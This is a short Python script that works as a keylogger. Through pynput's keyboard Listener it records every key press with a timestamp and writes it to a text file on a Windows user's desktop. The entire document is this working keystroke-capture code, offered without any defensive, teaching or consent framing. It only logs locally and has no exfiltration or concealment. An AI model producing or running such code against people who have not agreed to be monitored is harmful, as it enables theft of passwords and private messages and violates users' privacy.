from pynput.keyboard import Key,Listener
import logging

def key_press(key):
    logging.info(str(key))

if __name__=="__main__":
    logging.basicConfig(filename=(r"C:/Users/HP/Desktop/loggedkey.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')
    with Listener(on_press=key_press) as listner:
        listner.join()